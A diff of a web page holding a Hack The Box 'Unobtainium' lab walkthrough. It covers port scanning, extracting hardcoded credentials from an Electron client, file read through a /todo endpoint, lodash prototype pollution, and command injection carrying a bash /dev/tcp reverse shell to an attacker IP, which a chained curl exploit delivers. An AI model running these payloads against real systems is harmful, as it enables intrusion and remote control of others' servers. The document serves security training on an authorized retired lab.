@@ -1,14 +1,20 @@
 1:"$Sreact.fragment"
-2:I[8500,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-196f6e2bf5f3439c.js"],""]
-3:I[2372,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-196f6e2bf5f3439c.js"],"ThemeToggle"]
-4:I[7549,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-196f6e2bf5f3439c.js"],"MobileNavigation"]
-b:I[8945,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-196f6e2bf5f3439c.js"],"ArticleReadingGuide"]
-d:I[2372,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-196f6e2bf5f3439c.js"],"ThemeAutoReset"]
-f:I[484,[],"OutletBoundary"]
-10:"$Sreact.suspense"
-0:{"rsc":["$","$1","c",{"children":[[[["$","a",null,{"className":"skip-link","href":"#main-content","children":"Skip to content"}],["$","header",null,{"className":"site-header","children":["$","div",null,{"className":"shell header-inner","children":[["$","$L2",null,{"className":"brand","href":"/","aria-label":"CyberKareem home","children":[["$","span",null,{"className":"recon-prism-mark","aria-hidden":"true","children":[["$","span",null,{"className":"recon-prism-edge recon-prism-edge-north"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-west"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-east"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-south"}],["$","span",null,{"className":"recon-prism-spine"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-upper"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-lower"}],["$","span",null,{"className":"recon-prism-core"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-one"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-two"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-three"}]]}],["$","span",null,{"children":"CyberKareem"}]]}],["$","nav",null,{"className":"desktop-nav","aria-label":"Primary navigation","children":[["$","$L2","/about",{"href":"/about","children":"About"}],["$","$L2","/projects",{"href":"/projects","children":"Projects"}],["$","$L2","/research",{"href":"/research","children":"Research"}],["$","$L2","/writing",{"href":"/writing","aria-current":"page","children":"Writing"}],["$","$L2","/services",{"href":"/services","children":"Services"}],["$","$L2","/contact",{"href":"/contact","children":"Contact"}]]}],["$","$L3",null,{}],["$","$L2",null,{"className":"utility-link","href":"/contact#professional-enquiries","children":["Contact Abdullah ",["$","span",null,{"aria-hidden":"true","children":"→"}]]}],["$","$L4",null,{"items":[{"label":"About","href":"/about"},{"label":"Projects","href":"/projects"},{"label":"Research","href":"/research"},{"label":"Writing","href":"/writing"},{"label":"Services","href":"/services"},{"label":"Contact","href":"/contact"}],"activePath":"/writing"}]]}]}]],["$","main",null,{"id":"main-content","tabIndex":-1,"className":"article-main","children":[["$","article",null,{"className":"writing-article","children":[["$","header",null,{"className":"article-hero shell","data-motion":"hero","children":[["$","nav",null,{"className":"article-breadcrumb","aria-label":"Breadcrumb","children":[["$","$L2",null,{"href":"/writing","children":"Writing"}],["$","span",null,{"aria-hidden":"true","children":"/"}],["$","span",null,{"children":"Hack The Box"}]]}],["$","p",null,{"className":"page-eyebrow","children":"Hack The Box"}],["$","h1",null,{"children":"Hack The Box: Unobtainium Walkthrough"}],["$","p",null,{"className":"article-dek","children":"Electron client secrets and a file-read endpoint exposed the Node.js source, where prototype pollution unlocked a command-injection upload for a pod shell; reusing it against a dev pod yielded a cluster-admin token and a privileged host-mounted pod."}],["$","dl",null,{"className":"article-meta","children":[["$","div",null,{"children":[["$","dt",null,{"children":"Published"}],["$","dd",null,{"children":["$","time",null,{"dateTime":"2026-06-11T11:03:50.000Z","children":"11 Jun 2026"}]}]]}],["$","div",null,{"children":[["$","dt",null,{"children":"Reading time"}],["$","dd",null,{"children":[14," minutes"]}]]}],null,["$","div",null,{"children":[["$","dt",null,{"children":"Author"}],["$","dd",null,{"children":"Abdullah Kareem"}]]}]]}],["$","figure",null,{"className":"article-cover article-cover-machine","children":[["$","div",null,{"className":"article-cover-art","children":["$","img",null,{"src":"/writing/covers/hackthebox-unobtainium-walkthrough.webp","width":300,"height":300,"alt":"Hack The Box Unobtainium machine avatar","loading":"lazy","decoding":"async","fetchPriority":"low"}]}],["$","figcaption",null,{"children":[["$","span",null,{"children":"Official Unobtainium machine artwork, used for identification. Hack The Box is not affiliated with CyberKareem."}],["$","a",null,{"href":"https://www.hackthebox.com/machines/unobtainium","target":"_blank","rel":"nofollow noopener noreferrer","children":["Official Hack The Box machine page"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]]}]]}]]}],["$","div",null,{"className":"article-rule"}],["$","div",null,{"className":"article-layout shell","data-motion":"section","children":["$L5","$L6"]}]]}],null,"$L7"]}],"$L8","$L9"],null,"$La"]}],"isPartial":false,"staleTime":300,"varyParams":null,"buildId":"DK8DoHECLNCy57ryKFrJF"}
-5:["$","aside",null,{"className":"article-context","aria-label":"Article context","children":[["$","$Lb",null,{"headings":[{"id":"attack-chain","label":"Attack chain"},{"id":"phase-1-reconnaissance","label":"Phase 1: Reconnaissance"},{"id":"phase-2-the-electron-app-and-source-recovery","label":"Phase 2: The Electron App & Source Recovery"},{"id":"phase-3-api-enumeration-and-source-analysis","label":"Phase 3: API Enumeration & Source Analysis"},{"id":"phase-4-prototype-pollution-explained","label":"Phase 4: Prototype Pollution Explained"},{"id":"phase-5-command-injection-explained","label":"Phase 5: Command Injection Explained"},{"id":"phase-6-initial-foothold-user-flag","label":"Phase 6: Initial Foothold (User Flag)"},{"id":"phase-7-kubernetes-enumeration","label":"Phase 7: Kubernetes Enumeration"},{"id":"phase-8-lateral-movement-to-dev-container","label":"Phase 8: Lateral Movement to Dev Container"},{"id":"phase-9-privilege-escalation-via-kubernetes","label":"Phase 9: Privilege Escalation via Kubernetes"},{"id":"phase-10-root-flag","label":"Phase 10: Root Flag"},{"id":"key-lessons-and-takeaways","label":"Key Lessons & Takeaways"},{"id":"commands-cheat-sheet","label":"Commands Cheat Sheet"}]}],["$","div",null,{"className":"article-provenance","children":[["$","span",null,{"children":"Source"}],[["$","p",null,{"children":"Technical source and supporting notes."}],["$","a",null,{"href":"https://github.com/CyberKareem/OSWE-Prep/blob/96c70e045fff8d0d14702715a7528e2afe4f8ed2/HTB-Unobtainium.md","target":"_blank","rel":"nofollow noopener noreferrer","children":["Immutable source revision",["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","small",null,{"children":["CyberKareem/OSWE-Prep",", commit 96c70e045fff",""]}]]]}],["$","div",null,{"className":"article-review-note article-review-lab-safety","children":[["$","span",null,{"children":"Official machine record"}],["$","p",null,{"children":["Unobtainium, Linux, Hard",". Retirement verified ","12 Jul 2026","."," ","This walkthrough covers an authorized lab. Use these techniques only on systems you own or are explicitly authorized to test."]}],["$","a",null,{"href":"https://www.hackthebox.com/machines/unobtainium","target":"_blank","rel":"nofollow noopener noreferrer","children":["View public machine page ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]]}],[["$","div","source-context-0",{"className":"article-review-note article-review-source-context","children":[["$","span",null,{"children":"Source context"}],["$","p",null,{"children":"Based on Abdullah Kareem's public preparation notes and edited for clarity. Commands and technical claims remain tied to the documented lab and tool versions; this page does not add new solution steps or imply Hack The Box endorsement."}],null]}],["$","div","editorial-correction-1",{"className":"article-review-note article-review-editorial-correction","children":[["$","span",null,{"children":"Reusable artifacts removed"}],["$","p",null,{"children":"13 redacted retired-lab artifact occurrences were replaced with descriptive placeholders while preserving the attack method, including credentials, keys, tickets, hashes, flags, private links, or encoded material."}],null]}]]]}]
-c:T7312,<blockquote>
+2:I[8500,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-c900f5ec9cac0f8d.js"],""]
+3:I[2372,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-c900f5ec9cac0f8d.js"],"ThemeToggle"]
+4:I[7549,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-c900f5ec9cac0f8d.js"],"MobileNavigation"]
+11:I[8945,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-c900f5ec9cac0f8d.js"],"ArticleReadingGuide"]
+13:I[2372,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-c900f5ec9cac0f8d.js"],"ThemeAutoReset"]
+15:I[484,[],"OutletBoundary"]
+16:"$Sreact.suspense"
+0:{"rsc":["$","$1","c",{"children":[[[["$","a",null,{"className":"skip-link","href":"#main-content","children":"Skip to content"}],["$","header",null,{"className":"site-header","children":["$","div",null,{"className":"shell header-inner","children":[["$","$L2",null,{"className":"brand","href":"/","aria-label":"CyberKareem home","children":[["$","span",null,{"className":"recon-prism-mark","aria-hidden":"true","children":[["$","span",null,{"className":"recon-prism-edge recon-prism-edge-north"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-west"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-east"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-south"}],["$","span",null,{"className":"recon-prism-spine"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-upper"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-lower"}],["$","span",null,{"className":"recon-prism-core"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-one"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-two"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-three"}]]}],["$","span",null,{"children":"CyberKareem"}]]}],["$","nav",null,{"className":"desktop-nav","aria-label":"Primary navigation","children":[["$","$L2","/about",{"href":"/about","children":"About"}],["$","$L2","/projects",{"href":"/projects","children":"Projects"}],["$","$L2","/research",{"href":"/research","children":"Research"}],["$","$L2","/writing",{"href":"/writing","aria-current":"page","children":"Writing"}],["$","$L2","/services",{"href":"/services","children":"Services"}],["$","$L2","/contact",{"href":"/contact","children":"Contact"}]]}],["$","$L3",null,{}],["$","$L2",null,{"className":"utility-link","href":"/contact#professional-enquiries","children":["Contact Abdullah ",["$","span",null,{"aria-hidden":"true","children":"→"}]]}],["$","$L4",null,{"items":[{"label":"About","href":"/about"},{"label":"Projects","href":"/projects"},{"label":"Research","href":"/research"},{"label":"Writing","href":"/writing"},{"label":"Services","href":"/services"},{"label":"Contact","href":"/contact"}],"activePath":"/writing"}]]}]}]],["$","main",null,{"id":"main-content","tabIndex":-1,"className":"article-main","children":[["$","article",null,{"className":"writing-article","children":[["$","header",null,{"className":"article-hero shell","children":[["$","div",null,{"className":"article-hero-copy","data-motion":"hero","children":[["$","nav",null,{"className":"article-breadcrumb","aria-label":"Breadcrumb","children":[["$","$L2",null,{"href":"/writing","children":"Writing"}],["$","span",null,{"aria-hidden":"true","children":"/"}],["$","span",null,{"children":"Hack The Box"}]]}],["$","p",null,{"className":"page-eyebrow","children":"Hack The Box"}],["$","h1",null,{"children":"Hack The Box: Unobtainium Walkthrough"}],["$","p",null,{"className":"article-dek","children":"Electron client secrets and a file-read endpoint exposed the Node.js source, where prototype pollution unlocked a command-injection upload for a pod shell; reusing it against a dev pod yielded a cluster-admin token and a privileged host-mounted pod."}],["$","aside",null,{"className":"article-signal-deck article-signal-deck-htb","data-article-signal-kind":"lab","data-motion-surface":"instrument","aria-label":"Article orientation","children":[null,[["$","div",null,{"className":"article-signal-lab-node","aria-hidden":"true","children":[["$","span",null,{}],["$","span",null,{"className":"recon-prism-mark","aria-hidden":"true","children":[["$","span",null,{"className":"recon-prism-edge recon-prism-edge-north"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-west"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-east"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-south"}],["$","span",null,{"className":"recon-prism-spine"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-upper"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-lower"}],["$","span",null,{"className":"recon-prism-core"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-one"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-two"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-three"}]]}]]}],["$","div",null,{"className":"article-signal-heading article-signal-lab-identity","children":[["$","span",null,{"children":"Authorized retired lab"}],"$L5","$L6","$L7"]}],"$L8","$L9"],null,null]}]]}],"$La"]}],"$Lb","$Lc"]}],null,"$Ld"]}],"$Le","$Lf"],null,"$L10"]}],"isPartial":false,"staleTime":300,"varyParams":null,"buildId":"MVJfiMbnmqcLVn86bgJ_V"}
+5:["$","strong",null,{"children":"Unobtainium"}]
+6:["$","small",null,{"children":"Hack The Box machine record"}]
+7:["$","a",null,{"className":"article-signal-source","href":"https://www.hackthebox.com/machines/unobtainium","target":"_blank","rel":"nofollow noopener noreferrer","children":["Open public machine page"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]
+8:["$","dl",null,{"className":"article-signal-metrics article-signal-lab-metrics","children":[["$","div",null,{"className":"article-signal-metric","children":[["$","dt",null,{"children":"Operating system"}],["$","dd",null,{"children":"Linux"}]]}],["$","div",null,{"className":"article-signal-metric","children":[["$","dt",null,{"children":"Difficulty"}],["$","dd",null,{"children":"Hard"}]]}],["$","div",null,{"className":"article-signal-metric article-signal-metric-lab-state","children":[["$","dt",null,{"children":"Machine state"}],["$","dd",null,{"children":"Retired"}]]}],["$","div",null,{"className":"article-signal-metric","children":[["$","dt",null,{"children":"Retirement verified"}],["$","dd",null,{"children":["$","time",null,{"dateTime":"2026-07-12","children":"12 Jul 2026"}]}]]}]]}]
+9:["$","p",null,{"className":"article-signal-byline","children":["Published ","11 Jun 2026"," · ","Abdullah Kareem"]}]
+a:["$","figure",null,{"className":"article-cover article-cover-machine","children":[["$","div",null,{"className":"article-cover-art","children":["$","img",null,{"src":"/writing/covers/hackthebox-unobtainium-walkthrough.webp","width":300,"height":300,"alt":"Hack The Box Unobtainium machine avatar","loading":"lazy","decoding":"async","fetchPriority":"low"}]}],["$","figcaption",null,{"children":[["$","span",null,{"children":"Official Unobtainium machine artwork, used for identification. Hack The Box is not affiliated with CyberKareem."}],["$","a",null,{"href":"https://www.hackthebox.com/machines/unobtainium","target":"_blank","rel":"nofollow noopener noreferrer","children":["Official Hack The Box machine page"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]]}]]}]
+b:["$","div",null,{"className":"article-rule"}]
+12:T7bd3,<blockquote>
 <p><strong>Target IP:</strong> 10.129.136.226<br><strong>Attacker IP:</strong> 10.10.16.84<br><strong>Difficulty:</strong> Hard<br><strong>OS:</strong> Linux<br><strong>Tags:</strong> Kubernetes, Electron, Node.js, Prototype Pollution, Command Injection, Container Escape</p>
 </blockquote>
 <hr>
@@ -32,7 +38,7 @@ c:T7312,<blockquote>
 <h3 id="why-recon-first">Why Recon First?</h3>
 <p>You cannot attack what you don't understand. Reconnaissance is about building a map of the target. Every open port is a potential entry point. Every service banner is a clue. We need to be thorough because missing a port means missing an attack vector.</p>
 <h3 id="step-1-1-quick-port-scan">Step 1.1: Quick Port Scan</h3>
-<pre><code class="language-bash" data-language="bash">sudo nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.129.136.226
+<pre tabindex="0" aria-label="bash code or terminal block 1"><code class="language-bash" data-language="bash">sudo nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.129.136.226
 </code></pre>
 <p><strong>What this does:</strong></p>
 <ul>
@@ -42,14 +48,14 @@ c:T7312,<blockquote>
 </ul>
 <p> We scan ALL ports because boxes like this often hide services on high ports (like 31337). The port name "Elite" is literally hacker culture - it's a signal.</p>
 <p><strong>Results:</strong></p>
-<pre><code>PORT      STATE SERVICE
+<pre tabindex="0" aria-label="Code or terminal block 2"><code>PORT      STATE SERVICE
 22/tcp    open  ssh
 80/tcp    open  http
 8443/tcp  open  https-alt
 31337/tcp open  Elite
 </code></pre>
 <h3 id="step-1-2-service-version-detection">Step 1.2: Service Version Detection</h3>
-<pre><code class="language-bash" data-language="bash">sudo nmap -p 22,80,8443,31337 -sCV 10.129.136.226
+<pre tabindex="0" aria-label="bash code or terminal block 3"><code class="language-bash" data-language="bash">sudo nmap -p 22,80,8443,31337 -sCV 10.129.136.226
 </code></pre>
 <p><strong>What this does:</strong></p>
 <ul>
@@ -69,7 +75,7 @@ c:T7312,<blockquote>
 <li>The combination of a web server + Kubernetes + custom API suggests: <em>"There's an application running in containers, and I need to find a way in."</em></li>
 </ul>
 <h3 id="step-1-3-add-hosts-to-etc-hosts">Step 1.3: Add Hosts to /etc/hosts</h3>
-<pre><code class="language-bash" data-language="bash">echo "10.129.136.226 unobtainium.htb" | sudo tee -a /etc/hosts
+<pre tabindex="0" aria-label="bash code or terminal block 4"><code class="language-bash" data-language="bash">echo "10.129.136.226 unobtainium.htb" | sudo tee -a /etc/hosts
 </code></pre>
 <p><strong>Why?</strong> The TLS certificates on port 8443 reference <code>unobtainium</code> and <code>kubernetes.default.svc.cluster.local</code>. The website may also use virtual hosts. Adding the hostname ensures we don't get SSL errors or miss virtual host-specific content.</p>
 <hr>
@@ -84,13 +90,13 @@ c:T7312,<blockquote>
 </ol>
 <p><strong>Rule:</strong> reverse client software. Developers embed secrets in clients because they assume users won't look.</p>
 <h3 id="step-2-1-download-the-debian-package">Step 2.1: Download the Debian Package</h3>
-<pre><code class="language-bash" data-language="bash">wget http://10.129.136.226/downloads/unobtainium_debian.zip -O unobtainium_debian.zip
+<pre tabindex="0" aria-label="bash code or terminal block 5"><code class="language-bash" data-language="bash">wget http://10.129.136.226/downloads/unobtainium_debian.zip -O unobtainium_debian.zip
 unzip unobtainium_debian.zip
 </code></pre>
 <p><strong>Why Debian?</strong>
 We're on Kali (Debian-based). The <code>.deb</code> package format is trivial to unpack without installing. We could also analyze <code>.rpm</code> or <code>.snap</code>, but <code>.deb</code> is easiest for us.</p>
 <p><strong>Contents:</strong></p>
-<pre><code>unobtainium_1.0.0_amd64.deb
+<pre tabindex="0" aria-label="Code or terminal block 6"><code>unobtainium_1.0.0_amd64.deb
 unobtainium_1.0.0_amd64.deb.md5sum
 </code></pre>
 <h3 id="step-2-2-extract-the-deb-package">Step 2.2: Extract the .deb Package</h3>
@@ -100,19 +106,19 @@ unobtainium_1.0.0_amd64.deb.md5sum
 <li><code>control.tar.gz</code> : installation scripts and metadata</li>
 <li><code>data.tar.xz</code> : the actual files to install</li>
 </ul>
-<pre><code class="language-bash" data-language="bash">ar x unobtainium_1.0.0_amd64.deb
+<pre tabindex="0" aria-label="bash code or terminal block 7"><code class="language-bash" data-language="bash">ar x unobtainium_1.0.0_amd64.deb
 tar xf data.tar.xz
 </code></pre>
 <p> We do NOT <code>dpkg -i</code> and install this on our system. That's dangerous and unnecessary. We only need to read the files, not execute them.</p>
 <h3 id="step-2-3-find-the-electron-bundle">Step 2.3: Find the Electron Bundle</h3>
 <p>Electron apps bundle their JavaScript source into <code>.asar</code> files. Find it:</p>
-<pre><code class="language-bash" data-language="bash">find . -name "*.asar"
+<pre tabindex="0" aria-label="bash code or terminal block 8"><code class="language-bash" data-language="bash">find . -name "*.asar"
 # Output: ./opt/unobtainium/resources/app.asar
 </code></pre>
 <p><strong>What is ASAR?</strong>
 ASAR (Atom Shell Archive) is a simple tar-like archive format used by Electron. It's not compressed or encrypted - just packed. We can extract it with the <code>asar</code> Node.js tool.</p>
 <h3 id="step-2-4-extract-the-source-code">Step 2.4: Extract the Source Code</h3>
-<pre><code class="language-bash" data-language="bash"># Install asar globally
+<pre tabindex="0" aria-label="bash code or terminal block 9"><code class="language-bash" data-language="bash"># Install asar globally
 sudo npm install -g asar
 
 # Extract the app
@@ -121,10 +127,10 @@ asar extract ./opt/unobtainium/resources/app.asar ./app_source
 <p><strong>Result:</strong> Full JavaScript source code of the client application.</p>
 <h3 id="step-2-5-analyze-the-client-source">Step 2.5: Analyze the Client Source</h3>
 <p>Look at the key files:</p>
-<pre><code class="language-bash" data-language="bash">cat ./app_source/src/js/app.js
+<pre tabindex="0" aria-label="bash code or terminal block 10"><code class="language-bash" data-language="bash">cat ./app_source/src/js/app.js
 </code></pre>
 <p><strong>Discovery:</strong></p>
-<pre><code class="language-javascript" data-language="javascript">data: JSON.stringify({
+<pre tabindex="0" aria-label="javascript code or terminal block 11"><code class="language-javascript" data-language="javascript">data: JSON.stringify({
     "auth": {
         "name": "felamos",
         "password": "REDACTED"
@@ -141,7 +147,7 @@ asar extract ./opt/unobtainium/resources/app.asar ./app_source
 <li><strong>Method:</strong> <code>PUT</code> to <code>http://unobtainium.htb:31337/</code></li>
 </ul>
 <p>Also found in <code>todo.js</code>:</p>
-<pre><code class="language-javascript" data-language="javascript">$.ajax({
+<pre tabindex="0" aria-label="javascript code or terminal block 12"><code class="language-javascript" data-language="javascript">$.ajax({
     url: 'http://unobtainium.htb:31337/todo',
     type: 'post',
     data: JSON.stringify({
@@ -159,12 +165,12 @@ asar extract ./opt/unobtainium/resources/app.asar ./app_source
 <hr>
 <h2 id="phase-3-api-enumeration-and-source-analysis">Phase 3: API Enumeration &amp; Source Analysis</h2>
 <h3 id="step-3-1-test-the-todo-endpoint">Step 3.1: Test the /todo Endpoint</h3>
-<pre><code class="language-bash" data-language="bash">curl -s http://10.129.136.226:31337/todo \
+<pre tabindex="0" aria-label="bash code or terminal block 13"><code class="language-bash" data-language="bash">curl -s http://10.129.136.226:31337/todo \
   -H "Content-Type: application/json" \
   -d '{"auth": {"name": "felamos", "password": "REDACTED"}, "filename" : "todo.txt"}'
 </code></pre>
 <p><strong>Response:</strong></p>
-<pre><code class="language-json" data-language="json">{
+<pre tabindex="0" aria-label="json code or terminal block 14"><code class="language-json" data-language="json">{
   "ok": true,
   "content": "1. Create administrator zone.\n2. Update node JS API Server.\n3. Add Login functionality.\n4. Complete Get Messages feature.\n5. Complete ToDo feature.\n6. Implement Google Cloud Storage function...\n7. Improve security\n"
 }
@@ -172,7 +178,7 @@ asar extract ./opt/unobtainium/resources/app.asar ./app_source
 <p><strong>Analysis:</strong> The <code>/todo</code> endpoint reads files from the application directory. The developers' todo list even mentions "Improve security" - ironic.</p>
 <h3 id="step-3-2-read-the-server-source-code-via-lfi">Step 3.2: Read the Server Source Code via LFI</h3>
 <p>Since <code>/todo</code> reads files by name, we can try to read <code>index.js</code> (the main server file):</p>
-<pre><code class="language-bash" data-language="bash">curl -s http://10.129.136.226:31337/todo \
+<pre tabindex="0" aria-label="bash code or terminal block 15"><code class="language-bash" data-language="bash">curl -s http://10.129.136.226:31337/todo \
   -H "Content-Type: application/json" \
   -d '{"auth": {"name": "felamos", "password": "REDACTED"}, "filename" : "index.js"}' \
   | jq -r '.content'
@@ -180,7 +186,7 @@ asar extract ./opt/unobtainium/resources/app.asar ./app_source
 <p><strong>Critical discovery:</strong> We now have the <strong>entire server-side source code</strong>.</p>
 <h3 id="step-3-3-server-source-code-analysis">Step 3.3: Server Source Code Analysis</h3>
 <p>Key excerpts from the server code:</p>
-<pre><code class="language-javascript" data-language="javascript">const _ = require('lodash');
+<pre tabindex="0" aria-label="javascript code or terminal block 16"><code class="language-javascript" data-language="javascript">const _ = require('lodash');
 const { exec } = require("child_process");
 var root = require("google-cloudstorage-commands");
 
@@ -205,7 +211,7 @@ const users = [
 <h3 id="what-is-prototype-pollution">What is Prototype Pollution?</h3>
 <p>JavaScript is a <strong>prototype-based language</strong>. Every object inherits from <code>Object.prototype</code>. If you can modify <code>Object.prototype</code>, you modify ALL objects in the runtime.</p>
 <p>The <code>_.merge()</code> function in vulnerable lodash versions copies properties recursively. If you pass a payload like:</p>
-<pre><code class="language-json" data-language="json">{
+<pre tabindex="0" aria-label="json code or terminal block 17"><code class="language-json" data-language="json">{
   "__proto__": {
     "canUpload": true
   }
@@ -214,7 +220,7 @@ const users = [
 <p><code>_.merge()</code> will follow the <code>__proto__</code> chain and set <code>canUpload: true</code> on <code>Object.prototype</code>. <strong>Every object now has <code>canUpload: true</code>.</strong></p>
 <h3 id="why-does-this-work-on-unobtainium">Why Does This Work on Unobtainium?</h3>
 <p>Look at the server's <code>PUT /</code> handler:</p>
-<pre><code class="language-javascript" data-language="javascript">app.put('/', (req, res) =&gt; {
+<pre tabindex="0" aria-label="javascript code or terminal block 18"><code class="language-javascript" data-language="javascript">app.put('/', (req, res) =&gt; {
   const user = findUser(req.body.auth || {});
   if (!user) {
     res.status(403).send({ok: false, error: 'Access denied'});
@@ -232,7 +238,7 @@ const users = [
 </code></pre>
 <p>The <code>req.body.message</code> is attacker-controlled. We inject <code>__proto__: {canUpload: true}</code> into it. <code>_.merge()</code> pollutes the global prototype.</p>
 <p>Later, when the <code>/upload</code> endpoint checks:</p>
-<pre><code class="language-javascript" data-language="javascript">if (!user || !user.canUpload) {
+<pre tabindex="0" aria-label="javascript code or terminal block 19"><code class="language-javascript" data-language="javascript">if (!user || !user.canUpload) {
     res.status(403).send({ok: false, error: 'Access denied'});
 }
 </code></pre>
@@ -241,7 +247,7 @@ const users = [
 <hr>
 <h2 id="phase-5-command-injection-explained">Phase 5: Command Injection Explained</h2>
 <h3 id="the-vulnerable-code">The Vulnerable Code</h3>
-<pre><code class="language-javascript" data-language="javascript">app.post('/upload', (req, res) =&gt; {
+<pre tabindex="0" aria-label="javascript code or terminal block 20"><code class="language-javascript" data-language="javascript">app.post('/upload', (req, res) =&gt; {
   const user = findUser(req.body.auth || {});
   if (!user || !user.canUpload) {
     res.status(403).send({ok: false, error: 'Access denied'});
@@ -255,7 +261,7 @@ const users = [
 </code></pre>
 <h3 id="what-s-google-cloudstorage-commands">What's <code>google-cloudstorage-commands</code>?</h3>
 <p>This deprecated npm package has an <code>upload</code> function:</p>
-<pre><code class="language-javascript" data-language="javascript">function upload(inputDirectory, bucket, force = false) {
+<pre tabindex="0" aria-label="javascript code or terminal block 21"><code class="language-javascript" data-language="javascript">function upload(inputDirectory, bucket, force = false) {
     let _path = path.resolve(inputDirectory)
     let _rn = force ? '-r' : '-Rn'
     let _cmd = exec(`gsutil -m cp ${_rn} -a public-read ${_path} ${bucket}`)
@@ -264,20 +270,20 @@ const users = [
 </code></pre>
 <p><strong>The vulnerability:</strong> <code>bucket</code> (which is our <code>filename</code>) is passed directly into a shell command via <code>exec()</code>. No sanitization. No escaping.</p>
 <p>If we send:</p>
-<pre><code class="language-json" data-language="json">{"filename": "x; bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.16.84/443 0&gt;&amp;1'"}
+<pre tabindex="0" aria-label="json code or terminal block 22"><code class="language-json" data-language="json">{"filename": "x; bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.16.84/443 0&gt;&amp;1'"}
 </code></pre>
 <p>The executed command becomes:</p>
-<pre><code class="language-bash" data-language="bash">gsutil -m cp -r -a public-read ./ x; bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.16.84/443 0&gt;&amp;1'
+<pre tabindex="0" aria-label="bash code or terminal block 23"><code class="language-bash" data-language="bash">gsutil -m cp -r -a public-read ./ x; bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.16.84/443 0&gt;&amp;1'
 </code></pre>
 <p>The semicolon (<code>;</code>) terminates the <code>gsutil</code> command and starts our reverse shell.</p>
 <hr>
 <h2 id="phase-6-initial-foothold-user-flag">Phase 6: Initial Foothold (User Flag)</h2>
 <h3 id="step-6-1-start-a-listener">Step 6.1: Start a Listener</h3>
-<pre><code class="language-bash" data-language="bash">nc -lnvp 443
+<pre tabindex="0" aria-label="bash code or terminal block 24"><code class="language-bash" data-language="bash">nc -lnvp 443
 </code></pre>
 <h3 id="step-6-2-chain-the-exploit">Step 6.2: Chain the Exploit</h3>
 <p>We need to execute the prototype pollution and command injection <strong>quickly</strong> and <strong>on the same backend instance</strong>:</p>
-<pre><code class="language-bash" data-language="bash">curl -s -X PUT http://10.129.136.226:31337/ \
+<pre tabindex="0" aria-label="bash code or terminal block 25"><code class="language-bash" data-language="bash">curl -s -X PUT http://10.129.136.226:31337/ \
   -H "Content-Type: application/json" \
   -d '{"auth": {"name": "felamos", "password": "REDACTED"}, "message": {"test": "x", "__proto__": {"canUpload": true}}}' \
 &amp;&amp; curl -s -X POST http://10.129.136.226:31337/upload \
@@ -287,14 +293,14 @@ const users = [
 <p><strong>Why chain with <code>&amp;&amp;</code>?</strong> The prototype pollution effect is ephemeral. It only lasts for that Node.js process instance and can reset quickly. By chaining with <code>&amp;&amp;</code>, the second request fires immediately after the first completes.</p>
 <p><strong>If it fails</strong> (<code>Access denied</code>), the <code>/upload</code> hit a different backend pod. Just retry.</p>
 <h3 id="step-6-3-stabilize-the-shell">Step 6.3: Stabilize the Shell</h3>
-<pre><code class="language-bash" data-language="bash">python3 -c 'import pty;pty.spawn("bash")'
+<pre tabindex="0" aria-label="bash code or terminal block 26"><code class="language-bash" data-language="bash">python3 -c 'import pty;pty.spawn("bash")'
 # Ctrl+Z
 stty raw -echo; fg
 reset
 export TERM=xterm
 </code></pre>
 <h3 id="step-6-4-grab-the-user-flag">Step 6.4: Grab the User Flag</h3>
-<pre><code class="language-bash" data-language="bash">cat /root/user.txt
+<pre tabindex="0" aria-label="bash code or terminal block 27"><code class="language-bash" data-language="bash">cat /root/user.txt
 # 184995[redacted]f33e33a6
 </code></pre>
